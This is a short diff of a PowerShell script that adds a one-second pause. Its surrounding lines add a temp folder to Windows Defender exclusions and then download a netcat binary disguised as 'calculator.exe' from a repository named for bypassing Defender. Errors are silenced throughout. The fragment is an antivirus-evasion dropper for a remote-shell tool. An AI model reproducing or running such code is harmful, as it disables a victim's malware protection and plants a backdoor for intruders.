@@ -11,6 +11,8 @@ try {
     Add-MpPreference -ExclusionPath $TempDir
 } catch {}
 
+Start-Sleep -Seconds 1
+
 try {
     Invoke-WebRequest -Uri "https://raw.githubusercontent.com/KaiKim2/WindowsDefenderBypassNetcat/main/calculator.exe" -OutFile $NcPath
 } catch {}
